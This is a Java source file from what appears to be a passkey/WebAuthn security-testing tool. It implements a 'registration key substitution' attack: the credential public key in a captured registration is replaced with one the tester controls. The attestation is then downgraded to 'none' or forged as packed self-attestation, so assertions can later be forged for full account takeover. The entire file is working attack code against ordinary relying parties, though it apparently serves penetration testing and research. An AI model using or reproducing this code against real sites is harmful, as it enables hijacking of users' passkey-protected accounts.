package com.anvil.passkeyeditor.attacks;

import com.anvil.passkeyeditor.codec.CborCodec;
import com.anvil.passkeyeditor.crypto.CoseSigner;
import com.anvil.passkeyeditor.model.AttestationObject;
import com.anvil.passkeyeditor.model.AuthenticatorData;

/**
 * Attack #4 - registration key substitution.
 *
 * At registration the authenticator generates the credential keypair and the relying party only
 * ever sees the public half (inside {@code attestationObject.authData.attestedCredentialData}). With
 * {@code fmt="none"} there is no attestation signature over the authenticator data, so swapping
 * the embedded public key for one we hold the private half of is undetectable: the RP stores our
 * key under the victim's credential. From then on we can forge assertions at will
 * ({@link AssertionForger}) that the secure RP accepts - full account takeover.
 *
 * This transform mutates a decoded CREATE {@link AttestationObject} in place:
 *   - embeds {@code signer.publicCoseKey()} as the credential public key (its verbatim shadow is the
 *       canonical COSE encoding of our point, so the from-fields re-encode puts our key on the
 *       wire);
 *   - forces {@code fmt="none"} with an empty {@code attStmt} - dropping any real attestation (which we
 *       could not re-sign) and matching the only format the from-fields encoder emits;
 *   - nulls the raw shadows so {@link CborCodec#encodeAttestationObject} rebuilds from fields rather
 *       than echoing the original bytes.
 * Everything else - {@code rpIdHash}, flags, {@code signCount}, {@code aaguid}, and crucially the
 * {@code credentialId} (so the victim's later assertions still reference this credential) - is preserved
 * from the captured registration.
 *
 * Burp-free; the byte mechanics (substituted key re-encodes into a decodable EC2/ES256 registration,
 * byte-identical when unedited) are gated by {@code FromFieldsEncodeTest} and the end-to-end forgery by
 * {@code ForgeryOracleTest}.
 */
public final class RegistrationSubstituter {

    private final CborCodec codec;

    public RegistrationSubstituter(CborCodec codec) {
        this.codec = codec;
    }

    /**
     * Substitute {@code signer}'s public key into a decoded registration {@link AttestationObject},
     * forcing {@code fmt="none"} + empty {@code attStmt}. Mutates {@code attObj} in place.
     *
     * @param attObj a decoded CREATE attestation object whose authData carries attested credential data
     * @param signer the signer whose public key replaces the credential key (and whose private key the
     *               tool keeps, to forge assertions later)
     * @throws IllegalArgumentException if {@code attObj} is not a registration (no attested credential data)
     */
    public static void substitute(AttestationObject attObj, CoseSigner signer) {
        if (attObj == null || signer == null) {
            throw new IllegalArgumentException("attestationObject and signer are required");
        }
        AuthenticatorData ad = attObj.authData();
        if (ad == null || !ad.hasFlag(AuthenticatorData.FLAG_AT)) {
            throw new IllegalArgumentException(
                    "not a registration attestationObject (no attested credential data to substitute)");
        }
        // Embed OUR public key; its raw shadow is the canonical COSE encoding, so the from-fields
        // re-encode of authData emits exactly our key. Null the authData shadow to force that rebuild.
        ad.setCredentialPublicKey(signer.publicCoseKey());
        ad.setRaw(null);

        // Force fmt="none" with an empty attStmt: we cannot re-sign a real attestation, and "none" is
        // both the only format the from-fields encoder emits and one ~all consumer RPs accept.
        attObj.setFmt("none");
        attObj.setAttStmtRaw(null);
        attObj.setRaw(null);
    }

    /**
     * Substitute {@code signer}'s key and re-encode the attestation object to its new wire CBOR.
     *
     * @return the rebuilt {@code attestationObject} CBOR ({@code fmt="none"}, our credential key embedded)
     */
    public byte[] substituteAndEncode(AttestationObject attObj, CoseSigner signer) {
        substitute(attObj, signer);
        return codec.encodeAttestationObject(attObj);
    }

    /**
     * Substitute {@code signer}'s public key and wrap it in a WebAuthn packed self-attestation
     * (§8.2) - the selectable alternative to {@link #substitute} for an RP that requires attestation
     * but does not pin a trusted root chain. Mutates {@code attObj} in place; leaves {@code fmt="packed"}
     * with a two-entry {@code { alg, sig }} {@code attStmt} carrying no x5c.
     *
     * The signature is made by the credential's OWN (planted) private key - the {@code signer} whose
     * public half we embed - over {@code authenticatorData ‖ SHA-256(clientDataJSON)}, exactly the input
     * {@link AssertionForger} already assembles and signs. So this is algorithm-agnostic: the wire
     * form (ECDSA→DER, EdDSA→raw, RSA→raw) and the {@code alg} in the {@code attStmt} are taken from the
     * signer, never hardcoded. It is also relying-party-agnostic: a standard attestation format, no
     * per-vendor logic.
     *
     * Byte-identity discipline. The authData is encoded to its final wire bytes exactly ONCE and
     * pinned as its raw shadow, so the bytes SIGNED here are byte-identical to the bytes the attestation
     * object later EMITS (no double-encode drift). Any {@code credentialId}/flags edit must therefore be
     * applied to {@code attObj.authData()} before calling this, so the signature covers the final
     * authData.
     *
     * @param attObj         a decoded CREATE attestation object whose authData carries attested credential data
     * @param signer         the signer whose public key is planted and whose private key signs the attestation
     * @param clientDataJson the registration's inner {@code clientDataJSON} wire bytes (from the create request)
     * @throws IllegalArgumentException if {@code attObj} is not a registration, or an argument is null
     */
    public void substituteSelfAttested(AttestationObject attObj, CoseSigner signer, byte[] clientDataJson) {
        if (attObj == null || signer == null) {
            throw new IllegalArgumentException("attestationObject and signer are required");
        }
        if (clientDataJson == null) {
            throw new IllegalArgumentException(
                    "packed self-attestation requires the registration clientDataJSON to sign over");
        }
        AuthenticatorData ad = attObj.authData();
        if (ad == null || !ad.hasFlag(AuthenticatorData.FLAG_AT)) {
            throw new IllegalArgumentException(
                    "not a registration attestationObject (no attested credential data to substitute)");
        }
        // (a) Embed OUR public key; its raw shadow is the canonical COSE encoding, so the from-fields
        //     re-encode of authData emits exactly our key.
        ad.setCredentialPublicKey(signer.publicCoseKey());
        // (b) Zero the AAGUID (16 x 0x00): self-attestation makes no authenticator-model claim, and a
        //     self-attestation with a non-zero AAGUID is invalid per §8.2. Matches the setCredentialPublicKey
        //     field-edit pattern (the from-fields authData re-encode below emits the zeroed value).
        ad.setAaguid(new byte[AuthenticatorData.AAGUID_LENGTH]);
        // (c) Encode authData to its final wire bytes ONCE and pin them as the shadow. Signing and emitting
        //     then use the SAME bytes (byte-identity), and encodeAuthData keeps a substituted key verbatim.
        ad.setRaw(null);
        byte[] authDataBytes = codec.encodeAuthData(ad);
        ad.setRaw(authDataBytes);
        // (d) Sign authData ‖ SHA-256(clientDataJSON) by REUSING the assertion forger - already the correct
        //     per-algorithm wire form for whatever signer/alg is in play (no new signing code, no alg pin).
        byte[] sig = new AssertionForger().sign(authDataBytes, clientDataJson, signer);
        // (e) Build the attStmt { "alg": signer.coseAlg(), "sig": <sig> } with NO x5c, and mark fmt="packed".
        //     Null the whole-object shadow so encodeAttestationObject rebuilds from fields (emitting this
        //     attStmt + the pinned authData).
        byte[] attStmt = codec.encodePackedSelfAttStmt(signer.coseAlg(), sig);
        attObj.setFmt("packed");
        attObj.setAttStmtRaw(attStmt);
        attObj.setRaw(null);
    }

    /**
     * Substitute {@code signer}'s key as a packed self-attestation and re-encode to its new wire CBOR.
     *
     * @return the rebuilt {@code attestationObject} CBOR ({@code fmt="packed"}, our credential key embedded)
     */
    public byte[] substituteSelfAttestedAndEncode(AttestationObject attObj, CoseSigner signer,
                                                  byte[] clientDataJson) {
        substituteSelfAttested(attObj, signer, clientDataJson);
        return codec.encodeAttestationObject(attObj);
    }
}
